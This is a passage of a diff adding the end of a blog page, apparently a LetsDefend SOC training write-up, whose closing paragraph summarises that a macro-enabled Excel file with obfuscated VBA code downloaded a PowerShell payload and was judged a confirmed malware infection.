+<p>The alert was triggered due to a macro-enabled Excel file that contained obfuscated VBA code. Static and dynamic analysis confirmed the file downloads and executes a malicious payload using PowerShell, establishes outbound connections to multiple external servers, and attempts persistence. The activity represents a confirmed malware infection and should be treated as a high-priority incident.</p>
+
+                </div>
+            </article>
+
+            <hr />
+
+            <div class="post-info">
+                
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/letsdefend/">letsdefend</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/soc/">soc</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/blue/">blue</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/malware/">malware</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/xlsm/">xlsm</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/macro/">macro</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/powershell/">powershell</a></span>
+        
+    </p>
+
+                
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="http://localhost:1313/categories/soc-writeups/">SOC Writeups</a></span>
+        <span class="tag"><a href="http://localhost:1313/categories/malware-analysis/">Malware Analysis</a></span>
+        
+    </p>
+
+            </div>
+        </main>
+    </div>
+
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+            <span><a href="http://localhost:1313/"></a></span>
+            <span></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by Hugo</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.19d7885e5a4b0e5e2cd7238fc80b8b19888099cb78c032aedeb0b3b0010b8bb3dfb34849cf40a9e83f55f266aa32354528c10a24f2a42e6e8e21e813a26d9647.js" integrity="sha512-GdeIXlpLDl4s1yOPyAuLGYiAmct4wDKu3rCzsAELi7Pfs0hJz0Cp6D9V8maqMjVFKMEKJPKkLm6OIegTom2WRw=="></script>
+
+
+
+
+    </body>
+</html>
